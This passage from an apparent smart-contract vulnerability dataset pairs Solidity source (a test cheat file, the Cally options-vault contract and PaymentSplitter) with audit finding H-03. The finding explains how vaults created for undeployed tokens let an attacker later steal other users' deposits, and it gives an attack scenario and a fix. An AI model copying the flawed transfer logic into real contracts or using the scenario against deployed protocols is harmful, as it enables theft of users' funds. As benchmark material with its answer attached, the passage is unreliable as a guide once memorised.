without assembly\n            // by using o_code = new bytes(size)\n            o_code := mload(0x40)\n            // new \"memory end\" including padding\n            mstore(0x40, add(o_code, and(add(add(size, 0x20), 0x1f), not(0x1f))))\n            // store length in memory\n            mstore(o_code, size)\n            // actually retrieve the code, this needs assembly\n            extcodecopy(who, add(o_code, 0x20), 0, size)\n        }\n    }\n}\n\ncontract Bar {\n    constructor() {\n        /// `DEAL` STDCHEAT\n        totalSupply = 10000e18;\n        balanceOf[address(this)] = totalSupply;\n    }\n\n    /// `HOAX` STDCHEATS\n    function bar(address expectedSender) public payable {\n        require(msg.sender == expectedSender, \"!prank\");\n    }\n    function origin(address expectedSender) public payable {\n        require(msg.sender == expectedSender, \"!prank\");\n        require(tx.origin == expectedSender, \"!prank\");\n    }\n    function origin(address expectedSender, address expectedOrigin) public payable {\n        require(msg.sender == expectedSender, \"!prank\");\n        require(tx.origin == expectedOrigin, \"!prank\");\n    }\n\n    /// `DEAL` STDCHEAT\n    mapping (address => uint256) public balanceOf;\n    uint256 public totalSupply;\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\n/**\n\n\n    \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2557     \u2588\u2588\u2557  \u2588\u2588\u2557   \u2588\u2588\u2557\n    \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551     \u2588\u2588\u2551  \u255a\u2588\u2588\u2557 \u2588\u2588\u2554\u255d\n    \u2588\u2588\u2551     \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2551   \u255a\u2588\u2588\u2588\u2588\u2554\u255d \n    \u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2551    \u255a\u2588\u2588\u2554\u255d  \n    \u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551   \n     \u255a\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d   \n                                      \n\n    \n    NFT & ERC20 covered call vaults.\n    this is intended to be a public good.\n    pog pog pog.\n    \n\n*/\n\nimport \"solmate/utils/SafeTransferLib.sol\";\nimport \"solmate/utils/ReentrancyGuard.sol\";\nimport \"openzeppelin/access/Ownable.sol\";\n\nimport \"./CallyNft.sol\";\n\n/// @title Cally - https://cally.finance\n/// @author out.eth\n/// @notice NFT & ERC20 covered call vaults\ncontract Cally is CallyNft, ReentrancyGuard, Ownable {\n    using SafeTransferLib for ERC20;\n    using SafeTransferLib for address payable;\n\n    /// @notice Fires when a new vault has been created\n    /// @param vaultId The newly minted vault NFT\n    /// @param from The account that created the vault\n    /// @param token The token address of the underlying asset\n    event NewVault(uint256 indexed vaultId, address indexed from, address indexed token);\n\n    /// @notice Fires when an option has been bought from a vault\n    /// @param optionId The newly minted option NFT\n    /// @param from The account that bought the option\n    /// @param token The token address of the underlying asset\n    event BoughtOption(uint256 indexed optionId, address indexed from, address indexed token);\n\n    /// @notice Fires when an option is exercised\n    /// @param optionId The option NFT which is being exercised\n    /// @param from The account that exercised the option\n    event ExercisedOption(uint256 indexed optionId, address indexed from);\n\n    /// @notice Fires when someone harvests their ETH balance\n    /// @param from The account that is harvesting\n    /// @param amount The amount of ETH which was harvested\n    event Harvested(address indexed from, uint256 amount);\n\n    /// @notice Fires when someone initiates a withdrawal on their vault\n    /// @param vaultId The vault NFT which is being withdrawn\n    /// @param from The account that is initiating the withdrawal\n    event InitiatedWithdrawal(uint256 indexed vaultId, address indexed from);\n\n    /// @notice Fires when someone withdraws their vault\n    /// @param vaultId The vault NFT which is being withdrawn\n    /// @param from The account that is withdrawing\n    event Withdrawal(uint256 indexed vaultId, address indexed from);\n\n    enum TokenType {\n        ERC721,\n        ERC20\n    }\n\n    struct Vault {\n        uint256 tokenIdOrAmount;\n        address token;\n        uint8 premiumIndex; // indexes into `premiumOptions`\n        uint8 durationDays; // days\n        uint8 dutchAuctionStartingStrikeIndex; // indexes into `strikeOptions`\n        uint32 currentExpiration;\n        bool isExercised;\n        bool isWithdrawing;\n        TokenType tokenType;\n        uint256 currentStrike;\n        uint256 dutchAuctionReserveStrike;\n    }\n\n    uint32 public constant AUCTION_DURATION = 24 hours;\n\n    // prettier-ignore\n    uint256[] public premiumOptions = [0.01 ether, 0.025 ether, 0.05 ether, 0.075 ether, 0.1 ether, 0.25 ether, 0.5 ether, 0.75 ether, 1.0 ether, 2.5 ether, 5.0 ether, 7.5 ether, 10 ether, 25 ether, 50 ether, 75 ether, 100 ether];\n    // prettier-ignore\n    uint256[] public strikeOptions = [1 ether, 2 ether, 3 ether, 5 ether, 8 ether, 13 ether, 21 ether, 34 ether, 55 ether, 89 ether, 144 ether, 233 ether, 377 ether, 610 ether, 987 ether, 1597 ether, 2584 ether, 4181 ether, 6765 ether];\n\n    uint256 public feeRate = 0;\n    uint256 public protocolUnclaimedFees = 0;\n\n    /// @notice The current vault index. Used for determining which\n    ///         tokenId to use when minting a new vault. Increments by\n    ///         2 on each new mint.\n    uint256 public vaultIndex = 1;\n\n    /// @notice Mapping of vault tokenId -> vault information\n    mapping(uint256 => Vault) private _vaults;\n\n    /// @notice Mapping of vault tokenId -> vault beneficiary.\n    ///         Beneficiary is credited the premium when option is\n    ///         purchased or strike ETH when option is exercised.\n    mapping(uint256 => address) private _vaultBeneficiaries;\n\n    /// @notice The unharvested ethBalance of each account\n    mapping(address => uint256) public ethBalance;\n\n    /*********************\n        ADMIN FUNCTIONS\n    **********************/\n\n    /// @notice Sets the fee that is applied on exercise\n    /// @param feeRate_ The new fee rate: fee = 1% = (1 / 100) * 1e18\n    function setFee(uint256 feeRate_) external onlyOwner {\n        feeRate = feeRate_;\n    }\n\n    /// @notice Withdraws the protocol fees and sends to current owner\n    function withdrawProtocolFees() external onlyOwner returns (uint256 amount) {\n        amount = protocolUnclaimedFees;\n        protocolUnclaimedFees = 0;\n        payable(msg.sender).safeTransferETH(amount);\n    }\n\n    /**************************\n        MAIN LOGIC FUNCTIONS\n    ***************************/\n\n    /*\n        standard lifecycle:\n            createVault\n            buyOption (repeats)\n            exercise\n            initiateWithdraw\n            withdraw\n\n        [*] setVaultBeneficiary\n        [*] harvest\n\n        [*] can be called anytime in lifecycle\n    */\n\n    /// @notice Creates a new vault that perpetually sells calls\n    ///         on the underlying assets until a call option is exercised\n    ///         or the owner initiates a withdrawal.\n    /// @param tokenIdOrAmount The tokenId (NFT) or amount (ERC20) to vault\n    /// @param token The address of the NFT or ERC20 contract to vault\n    /// @param premiumIndex The index into the premiumOptions of each call that is sold\n    /// @param durationDays The length/duration of each call that is sold in days\n    /// @param dutchAuctionStartingStrikeIndex The index into the strikeOptions for the starting strike for each dutch auction\n    /// @param dutchAuctionReserveStrike The reserve strike for each dutch auction\n    /// @param tokenType The type of the underlying asset (NFT or ERC20)\n    function createVault(\n        uint256 tokenIdOrAmount,\n        address token,\n        uint8 premiumIndex,\n        uint8 durationDays,\n        uint8 dutchAuctionStartingStrikeIndex,\n        uint256 dutchAuctionReserveStrike,\n        TokenType tokenType\n    ) external returns (uint256 vaultId) {\n        require(premiumIndex < premiumOptions.length, \"Invalid premium index\");\n        require(dutchAuctionStartingStrikeIndex < strikeOptions.length, \"Invalid strike index\");\n        require(dutchAuctionReserveStrike < strikeOptions[dutchAuctionStartingStrikeIndex], \"Reserve strike too small\");\n        require(durationDays > 0, \"durationDays too small\");\n        require(tokenType == TokenType.ERC721 || tokenType == TokenType.ERC20, \"Invalid token type\");\n\n        Vault memory vault = Vault({\n            tokenIdOrAmount: tokenIdOrAmount,\n            token: token,\n            premiumIndex: premiumIndex,\n            durationDays: durationDays,\n            dutchAuctionStartingStrikeIndex: dutchAuctionStartingStrikeIndex,\n            currentExpiration: uint32(block.timestamp),\n            isExercised: false,\n            isWithdrawing: false,\n            tokenType: tokenType,\n            currentStrike: 0,\n            dutchAuctionReserveStrike: dutchAuctionReserveStrike\n        });\n\n        // vault index should always be odd\n        vaultIndex += 2;\n        vaultId = vaultIndex;\n        _vaults[vaultId] = vault;\n\n        // give msg.sender vault token\n        _mint(msg.sender, vaultId);\n\n        emit NewVault(vaultId, msg.sender, token);\n\n        // transfer the NFTs or ERC20s to the contract\n        vault.tokenType == TokenType.ERC721\n            ? ERC721(vault.token).transferFrom(msg.sender, address(this), vault.tokenIdOrAmount)\n            : ERC20(vault.token).safeTransferFrom(msg.sender, address(this), vault.tokenIdOrAmount);\n    }\n\n    /// @notice Buys an option from a vault at a fixed premium and variable strike\n    ///         which is dependent on the dutch auction. Premium is credited to\n    ///         vault beneficiary.\n    /// @param vaultId The tokenId of the vault to buy the option from\n    function buyOption(uint256 vaultId) external payable returns (uint256 optionId) {\n        Vault memory vault = _vaults[vaultId];\n\n        // vaultId should always be odd\n        require(vaultId % 2 != 0, \"Not vault type\");\n\n        // check vault exists\n        require(ownerOf(vaultId) != address(0), \"Vault does not exist\");\n\n        // check that the vault still has the NFTs as collateral\n        require(vault.isExercised == false, \"Vault already exercised\");\n\n        // check that the vault is not in withdrawing state\n        require(vault.isWithdrawing == false, \"Vault is being withdrawn\");\n\n        // check enough eth was sent to cover premium\n        uint256 premium = getPremium(vaultId);\n        require(msg.value >= premium, \"Incorrect ETH amount sent\");\n\n        // check option associated with the vault has expired\n        uint32 auctionStartTimestamp = vault.currentExpiration;\n        require(block.timestamp >= auctionStartTimestamp, \"Auction not started\");\n\n        // set new currentStrike\n        vault.currentStrike = getDutchAuctionStrike(\n            strikeOptions[vault.dutchAuctionStartingStrikeIndex],\n            vault.currentExpiration + AUCTION_DURATION,\n            vault.dutchAuctionReserveStrike\n        );\n\n        // set new expiration\n        vault.currentExpiration = uint32(block.timestamp) + (vault.durationDays * 1 days);\n\n        // update the vault with the new option expiration and strike\n        _vaults[vaultId] = vault;\n\n        // force transfer the vault's associated option from old owner to new owner\n        // option id for a respective vault is always vaultId + 1\n        optionId = vaultId + 1;\n        _forceTransfer(msg.sender, optionId);\n\n        // increment vault beneficiary's unclaimed premiums\n        address beneficiary = getVaultBeneficiary(vaultId);\n        ethBalance[beneficiary] += msg.value;\n\n        emit BoughtOption(optionId, msg.sender, vault.token);\n    }\n\n    /// @notice Exercises a call option and sends the underlying assets to the\n    ///         exerciser and the strike ETH to the vault beneficiary.\n    /// @param optionId The tokenId of the option to exercise\n    function exercise(uint256 optionId) external payable {\n        // optionId should always be even\n        require(optionId % 2 == 0, \"Not option type\");\n\n        // check owner\n        require(msg.sender == ownerOf(optionId), \"You are not the owner\");\n\n        uint256 vaultId = optionId - 1;\n        Vault memory vault = _vaults[vaultId];\n\n        // check option hasn't expired\n        require(block.timestamp < vault.currentExpiration, \"Option has expired\");\n\n        // check correct ETH amount was sent to pay the strike\n        require(msg.value == vault.currentStrike, \"Incorrect ETH sent for strike\");\n\n        // burn the option token\n        _burn(optionId);\n\n        // mark the vault as exercised\n        vault.isExercised = true;\n        _vaults[vaultId] = vault;\n\n        // collect protocol fee\n        uint256 fee = 0;\n        if (feeRate > 0) {\n            fee = (msg.value * feeRate) / 1e18;\n            protocolUnclaimedFees += fee;\n        }\n\n        // increment vault beneficiary's ETH balance\n        ethBalance[getVaultBeneficiary(vaultId)] += msg.value - fee;\n\n        emit ExercisedOption(optionId, msg.sender);\n\n        // transfer the NFTs or ERC20s to the exerciser\n        vault.tokenType == TokenType.ERC721\n            ? ERC721(vault.token).transferFrom(address(this), msg.sender, vault.tokenIdOrAmount)\n            : ERC20(vault.token).safeTransfer(msg.sender, vault.tokenIdOrAmount);\n    }\n\n    /// @notice Initiates a withdrawal so that the vault will no longer sell\n    ///         another call once the currently active call option has expired.\n    /// @param vaultId The tokenId of the vault to initiate a withdrawal on\n    function initiateWithdraw(uint256 vaultId) external {\n        // vaultId should always be odd\n        require(vaultId % 2 != 0, \"Not vault type\");\n\n        // check msg.sender owns the vault\n        require(msg.sender == ownerOf(vaultId), \"You are not the owner\");\n\n        _vaults[vaultId].isWithdrawing = true;\n\n        emit InitiatedWithdrawal(vaultId, msg.sender);\n    }\n\n    /// @notice Sends the underlying assets back to the vault owner and claims any\n    ///         unharvested premiums for the owner. Vault and it's associated option\n    ///         NFT are burned.\n    /// @param vaultId The tokenId of the vault to withdraw\n    function withdraw(uint256 vaultId) external nonReentrant {\n        // vaultId should always be odd\n        require(vaultId % 2 != 0, \"Not vault type\");\n\n        // check owner\n        require(msg.sender == ownerOf(vaultId), \"You are not the owner\");\n\n        Vault memory vault = _vaults[vaultId];\n\n        // check vault can be withdrawn\n        require(vault.isExercised == false, \"Vault already exercised\");\n        require(vault.isWithdrawing, \"Vault not in withdrawable state\");\n        require(block.timestamp > vault.currentExpiration, \"Option still active\");\n\n        // burn option and vault\n        uint256 optionId = vaultId + 1;\n        _burn(optionId);\n        _burn(vaultId);\n\n        emit Withdrawal(vaultId, msg.sender);\n\n        // claim any ETH still in the account\n        harvest();\n\n        // transfer the NFTs or ERC20s back to the owner\n        vault.tokenType == TokenType.ERC721\n            ? ERC721(vault.token).transferFrom(address(this), msg.sender, vault.tokenIdOrAmount)\n            : ERC20(vault.token).safeTransfer(msg.sender, vault.tokenIdOrAmount);\n    }\n\n    /// @notice Sets the vault beneficiary that will receive premiums/strike ETH from the vault\n    /// @param vaultId The tokenId of the vault to update\n    /// @param beneficiary The new vault beneficiary\n    function setVaultBeneficiary(uint256 vaultId, address beneficiary) external {\n        // vaultId's should always be odd\n        require(vaultId % 2 != 0, \"Not vault type\");\n        require(msg.sender == ownerOf(vaultId), \"Not owner\");\n\n        _vaultBeneficiaries[vaultId] = beneficiary;\n    }\n\n    /// @notice Sends any unclaimed ETH (premiums/strike) to the msg.sender\n    function harvest() public returns (uint256 amount) {\n        // reset premiums\n        amount = ethBalance[msg.sender];\n        ethBalance[msg.sender] = 0;\n\n        emit Harvested(msg.sender, amount);\n\n        // transfer premiums to owner\n        payable(msg.sender).safeTransferETH(amount);\n    }\n\n    /**********************\n        GETTER FUNCTIONS\n    ***********************/\n\n    /// @notice Get the current beneficiary for a vault\n    /// @param vaultId The tokenId of the vault to fetch the beneficiary for\n    /// @return beneficiary The beneficiary for the vault\n    function getVaultBeneficiary(uint256 vaultId) public view returns (address beneficiary) {\n        address currentBeneficiary = _vaultBeneficiaries[vaultId];\n\n        // return the current owner if vault beneficiary is not set\n        return currentBeneficiary == address(0) ? ownerOf(vaultId) : currentBeneficiary;\n    }\n\n    /// @notice Get details for a vault\n    /// @param vaultId The tokenId of the vault to fetch the details for\n    function vaults(uint256 vaultId) external view returns (Vault memory) {\n        return _vaults[vaultId];\n    }\n\n    /// @notice Get the fixed option premium for a vault\n    /// @param vaultId The tokenId of the vault to fetch the premium for\n    /// @return premium The premium for the vault\n    function getPremium(uint256 vaultId) public view returns (uint256 premium) {\n        Vault memory vault = _vaults[vaultId];\n        return premiumOptions[vault.premiumIndex];\n    }\n\n    /// @notice Get the current dutch auction strike for a start value and end\n    ///         timestamp. Strike decreases exponentially to 0 over time starting\n    ///         at startingStrike. Minimum value returned is reserveStrike.\n    /// @param startingStrike The starting strike value\n    /// @param auctionEndTimestamp The unix timestamp when the auction ends\n    /// @param reserveStrike The minimum value for the strike\n    /// @return strike The strike\n    function getDutchAuctionStrike(\n        uint256 startingStrike,\n        uint32 auctionEndTimestamp,\n        uint256 reserveStrike\n    ) public view returns (uint256 strike) {\n        /*\n            delta = max(auctionEnd - currentTimestamp, 0)\n            progress = delta / auctionDuration\n            auctionStrike = progress^2 * startingStrike\n            strike = max(auctionStrike, reserveStrike)\n        */\n        uint256 delta = auctionEndTimestamp > block.timestamp ? auctionEndTimestamp - block.timestamp : 0;\n        uint256 progress = (1e18 * delta) / AUCTION_DURATION;\n        uint256 auctionStrike = (progress * progress * startingStrike) / (1e18 * 1e18);\n\n        // max(auctionStrike, reserveStrike)\n        strike = auctionStrike > reserveStrike ? auctionStrike : reserveStrike;\n    }\n\n    /*************************\n        OVVERIDES FUNCTIONS\n    **************************/\n\n    /// @dev Resets the beneficiary address when transferring vault NFTs.\n    ///      The new beneficiary will be the account receiving the vault NFT.\n    function transferFrom(\n        address from,\n        address to,\n        uint256 id\n    ) public override {\n        require(from == _ownerOf[id], \"WRONG_FROM\");\n        require(to != address(0), \"INVALID_RECIPIENT\");\n        require(\n            msg.sender == from || isApprovedForAll[from][msg.sender] || msg.sender == getApproved[id],\n            \"NOT_AUTHORIZED\"\n        );\n\n        // reset the beneficiary\n        bool isVaultToken = id % 2 != 0;\n        if (isVaultToken) {\n            _vaultBeneficiaries[id] = address(0);\n        }\n\n        _ownerOf[id] = to;\n        delete getApproved[id];\n\n        emit Transfer(from, to, id);\n    }\n\n    function tokenURI(uint256 tokenId) public view override returns (string memory) {\n        require(_ownerOf[tokenId] != address(0), \"URI query for NOT_MINTED token\");\n\n        bool isVaultToken = tokenId % 2 != 0;\n        Vault memory vault = _vaults[isVaultToken ? tokenId : tokenId - 1];\n\n        string memory jsonStr = renderJson(\n            vault.token,\n            vault.tokenIdOrAmount,\n            getPremium(vault.premiumIndex),\n            vault.durationDays,\n            strikeOptions[vault.dutchAuctionStartingStrikeIndex],\n            vault.currentExpiration,\n            vault.currentStrike,\n            vault.isExercised,\n            isVaultToken\n        );\n\n        return string(abi.encodePacked(\"data:application/json;base64,\", Base64.encode(bytes(jsonStr))));\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (finance/PaymentSplitter.sol)\n\npragma solidity ^0.8.0;\n\nimport \"../token/ERC20/utils/SafeERC20.sol\";\nimport \"../utils/Address.sol\";\nimport \"../utils/Context.sol\";\n\n/**\n * @title PaymentSplitter\n * @dev This contract allows to split Ether payments among a group of accounts. The sender does not need to be aware\n * that the Ether will be split in this way, since it is handled transparently by the contract.\n *\n * The split can be in equal parts or in any other arbitrary proportion. The way this is specified is by assigning each\n * account to a number of shares. Of all the Ether that this contract receives, each account will then be able to claim\n * an amount proportional to the percentage of total shares they were assigned.\n *\n * `PaymentSplitter` follows a _pull payment_ model. This means that payments are not automatically forwarded to the\n * accounts but kept in this contract, and the actual transfer is triggered as a separate step by calling the {release}\n * function.\n *\n * NOTE: This contract assumes that ERC20 tokens will behave similarly to native tokens (Ether). Rebasing tokens, and\n * tokens that apply fees during transfers, are likely to not be supported as expected. If in doubt, we encourage you\n * to run tests before sending real value to this contract.\n */\ncontract PaymentSplitter is Context {\n    event PayeeAdded(address account, uint256 shares);\n    event PaymentReleased(address to, uint256 amount);\n    event ERC20PaymentReleased(IERC20 indexed token, address to, uint256 amount);\n    event PaymentReceived(address from, uint256 amount);\n\n    uint256 private _totalShares;\n    uint256 private _totalReleased;\n\n    mapping(address => uint256) private _shares;\n    mapping(address => uint256) private _released;\n    address[] private _payees;\n\n    mapping(IERC20 => uint256) private _erc20TotalReleased;\n    mapping(IERC20 => mapping(address => uint256)) private _erc20Released;\n\n    /**\n     * @dev Creates an instance of `PaymentSplitter` where each account in `payees` is assigned the number of shares at\n     * the matching position in the `shares` array.\n     *\n     * All addresses in `payees` must be non-zero. Both arrays must have the same non-zero length, and there must be no\n     * duplicates in `payees`.\n     */\n    constructor(address[] memory payees, uint256[] memory shares_) payable {\n        require(payees.length == shares_.length, \"PaymentSplitter: payees and shares length mismatch\");\n        require(payees.length > 0, \"PaymentSplitter: no payees\");\n\n        for (uint256 i = 0; i < payees.length; i++) {\n            _addPayee(payees[i], shares_[i]);\n        }\n    }\n\n    /**\n     * @dev The Ether received will be logged with {PaymentReceived} events. Note that these events are not fully\n     * reliable: it's possible for a contract to receive Ether without triggering this function. This only affects the\n     * reliability of the events, and not the actual splitting of Ether.\n     *\n     * To learn more about this see the Solidity documentation for\n     * https://solidity.readthedocs.io/en/latest/contracts.html#fallback-function[fallback\n     * functions].\n     */\n    receive() external payable virtual {\n        emit PaymentReceived(_msgSender(), msg.value);\n    }\n\n    /**\n     * @dev Getter for the total shares held by payees.\n     */\n    function totalShares() public view returns (uint256) {\n        return _totalShares;\n    }\n\n    /**\n     * @dev Getter for the total amount of Ether already released.\n     */\n    function totalReleased() public view returns (uint256) {\n        return _totalReleased;\n    }\n\n    /**\n     * @dev Getter for the total amount of `token` already released. `token` should be the address of an IERC20\n     * contract.\n     */\n    function totalReleased(IERC20 token) public view returns (uint256) {\n        return _erc20TotalReleased[token];\n    }\n\n    /**\n     * @dev Getter for the amount of shares held by an account.\n     */\n    function shares(address account) public view returns (uint256) {\n        return _shares[account];\n    }\n\n    /**\n     * @dev Getter for the amount of Ether already released to a payee.\n     */\n    function released(address account) public view returns (uint256) {\n        return _released[account];\n    }\n\n    /**\n     * @dev Getter for the amount of `token` tokens already released to a payee. `token` should be the address of an\n     * IERC20 contract.\n     */\n    function released(IERC20 token, address account) public view returns (uint256) {\n        return _erc20Released[token][account];\n    }\n\n    /**\n     * @dev Getter for the address of the payee number `index`.\n     */\n    function payee(uint256 index) public view returns (address) {\n        return _payees[index];\n    }\n\n    /**\n     * @dev Triggers a transfer to `account` of the amount of Ether they are owed, according to their percentage of the\n     * total shares and their previous withdrawals.\n     */\n    function release(address payable account) public virtual {\n        require(_shares[account] > 0, \"PaymentSplitter: account has no shares\");\n\n        uint256 totalReceived = address(this).balance + totalReleased();\n        uint256 payment = _pendingPayment(account, totalReceived, released(account));\n\n        require(payment != 0, \"PaymentSplitter: account is not due payment\");\n\n        _released[account] += payment;\n        _totalReleased += payment;\n\n        Address.sendValue(account, payment);\n        emit PaymentReleased(account, payment);\n    }\n\n    /**\n     * @dev Triggers a transfer to `account` of the amount of `token` tokens they are owed, according to their\n     * percentage of the total shares and their previous withdrawals. `token` must be the address of an IERC20\n     * contract.\n     */\n    function release(IERC20 token, address account) public virtual {\n        require(_shares[account] > 0, \"PaymentSplitter: account has no shares\");\n\n        uint256 totalReceived = token.balanceOf(address(this)) + totalReleased(token);\n        uint256 payment = _pendingPayment(account, totalReceived, released(token, account));\n\n        require(payment != 0, \"PaymentSplitter: account is not due payment\");\n\n        _erc20Released[token][account] += payment;\n        _erc20TotalReleased[token] += payment;\n\n        SafeERC20.safeTransfer(token, account, payment);\n        emit ERC20PaymentReleased(token, account, payment);\n    }\n\n    /**\n     * @dev internal logic for computing the pending payment of an `account` given the token historical balances and\n     * already released amounts.\n     */\n    function _pendingPayment(\n        address account,\n        uint256 totalReceived,\n        uint256 alreadyReleased\n    ) private view returns (uint256) {\n        return (totalReceived * _shares[account]) / _totalShares - alreadyReleased;\n    }\n\n    /**\n     * @dev Add a new payee to the contract.\n     * @param account The address of the payee to add.\n     * @param shares_ The number of shares owned by the payee.\n     */\n    function _addPayee(address account, uint256 shares_) private {\n        require(account != address(0), \"PaymentSplitter: account is the zero address\");\n        require(shares_ > 0, \"PaymentSplitter: shares are 0\");\n        require(_shares[account] == 0, \"PaymentSplitter: account already has shares\");\n\n        _payees.push(account);\n        _shares[account] = shares_;\n        _totalShares = _totalShares + shares_;\n        emit PayeeAdded(account, shares_);\n    }\n}\n\n\n",
        "CodeNames": [
            "StdCheats.t.sol",
            "Cally.sol",
            "PaymentSplitter.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-03",
                "Location": [
                    "//solidity\nfunction createVault(\n    uint256 tokenIdOrAmount,\n    address token,\n    ...\n) external returns (uint256 vaultId) {\n    ...\n    Vault memory vault = Vault({\n        ...\n    });\n\n    // vault index should always be odd\n    vaultIndex += 2;\n    vaultId = vaultIndex;\n    _vaults[vaultId] = vault;\n\n    // give msg.sender vault token\n    _mint(msg.sender, vaultId);\n\n    emit NewVault(vaultId, msg.sender, token);\n\n    // transfer the NFTs or ERC20s to the contract\n    vault.tokenType == TokenType.ERC721\n        ? ERC721(vault.token).transferFrom(msg.sender, address(this), vault.tokenIdOrAmount)\n        : ERC20(vault.token).safeTransferFrom(msg.sender, address(this), vault.tokenIdOrAmount);\n}\n",
                    "//solidity\nimport \"solmate/utils/SafeTransferLib.sol\";\n\n...\n\ncontract Cally is CallyNft, ReentrancyGuard, Ownable {\n    using SafeTransferLib for ERC20;\n    ...\n"
                ],
                "Type": " [WP-H0",
                "Description": "\n<https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L158-L201\n\nsolidity\nfunction createVault(\n    uint256 tokenIdOrAmount,\n    address token,\n    ...\n) external returns (uint256 vaultId) {\n    ...\n    Vault memory vault = Vault({\n        ...\n    });\n\n    // vault index should always be odd\n    vaultIndex += 2;\n    vaultId = vaultIndex;\n    _vaults[vaultId] = vault;\n\n    // give msg.sender vault token\n    _mint(msg.sender, vaultId);\n\n    emit NewVault(vaultId, msg.sender, token);\n\n    // transfer the NFTs or ERC20s to the contract\n    vault.tokenType == TokenType.ERC721\n        ? ERC721(vault.token).transferFrom(msg.sender, address(this), vault.tokenIdOrAmount)\n        : ERC20(vault.token).safeTransferFrom(msg.sender, address(this), vault.tokenIdOrAmount);\n}\n\n\n<https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L23-L34\n\nsolidity\nimport \"solmate/utils/SafeTransferLib.sol\";\n\n...\n\ncontract Cally is CallyNft, ReentrancyGuard, Ownable {\n    using SafeTransferLib for ERC20;\n    ...\n\n\nWhen creating a new vault, solmate's SafeTransferLib is used for pulling vault.token from the caller's account, this issue won't exist if OpenZeppelin's SafeERC20 is used instead.\n\nThat's because there is a subtle difference between the implementation of solmate's SafeTransferLib and OZ's SafeERC20:\n\nOZ's SafeERC20 checks if the token is a contract or not, solmate's SafeTransferLib does not.\n\nSee: <https://github.com/Rari-Capital/solmate/blob/main/src/utils/SafeTransferLib.sol#L9\n\n Note that none of the functions in this library check that a token has code at all! That responsibility is delegated to the caller.\n\nAs a result, when the token's address has no code, the transaction will just succeed with no error.\n\nThis attack vector was made well-known by the qBridge hack back in Jan 2022.\n\nFor our project, this alone still won't be a problem, a vault created and wrongfully accounted for a certain amount of balance for a non-existing token won't be much of a problem, there will be no fund loss as long as the token stays that way (being non-existing).\n\nHowever, it's becoming popular for protocols to deploy their token across multiple networks and when they do so, a common practice is to deploy the token contract from the same deployer address and with the same nonce so that the token address can be the same for all the networks.\n\nFor example: $1INCH is using the same token address for both Ethereum and BSC; Gelato's $GEL token is using the same token address for Ethereum, Fantom and Polygon.\n\nA sophisticated attacker can exploit it by taking advantage of that and setting traps on multiple potential tokens to steal from the future users that deposits with such tokens.\n\n\nGiven:\n\n*   ProjectA has TokenA on another network;\n*   ProjectB has TokenB on another network;\n*   ProjectC has TokenC on another network;\n\n1.  The attacker createVault() for TokenA, TokenB, and TokenC with 10000e18 as tokenIdOrAmount each;\n2.  A few months later, ProjectB lunched TokenB on the local network at the same address;\n3.  Alice created a vault with 11000e18 TokenB;\n4.  The attacker called initiateWithdraw() and then withdraw() to receive 10000e18 TokenB.\n\nIn summary, one of the traps set by the attacker was activated by the deployment of  TokenB and Alice was the victim. As a result, 10000e18 TokenB was stolen by the attacker.\n\n",
                "Repair": "\nConsider using OZ's SafeERC20 instead.\n\n\noutdoteth (Cally) confirmed and resolved(https://github.com/code-423n4/2022-05-cally-findings/issues/225#issuecomment-1129066964):\n  this issue has been fixed here: https://github.com/outdoteth/cally/pull/5\n\nHardlyDifficult (judge) commented(https://github.com/code-423n4/2022-05-cally-findings/issues/225#issuecomment-1133421876):\n  Great catch and the potential attack is very clearly explained. Although the window for an attack like this would not be common, it's an easy trap to setup and likely would occur as some point if Cally is planning to support multiple networks.\n\n\n\n*\n\n \n\n"
            }
        ]
    }
]